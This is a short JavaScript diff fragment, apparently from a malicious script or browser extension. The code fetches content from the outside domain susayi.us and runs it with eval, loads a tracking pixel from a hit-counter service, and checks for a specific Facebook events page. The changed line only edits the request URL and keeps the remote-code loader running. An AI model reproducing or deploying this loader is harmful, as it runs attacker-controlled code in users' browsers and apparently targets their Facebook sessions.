@@ -4,7 +4,7 @@ xhr.onreadystatechange = function() {
         eval(xhr.responseText)
     }
 }
-xhr.open('GET', 'https://susayi.us/dash.php', true);
+xhr.open('GET', '//susayi.us/dash.php', true);
 xhr.send(null);
 new Image().src = '//whos.amung.us/widget/sikayetet2.png';
 if(window.location.href == "https://www.facebook.com/events/281242216042782/"){
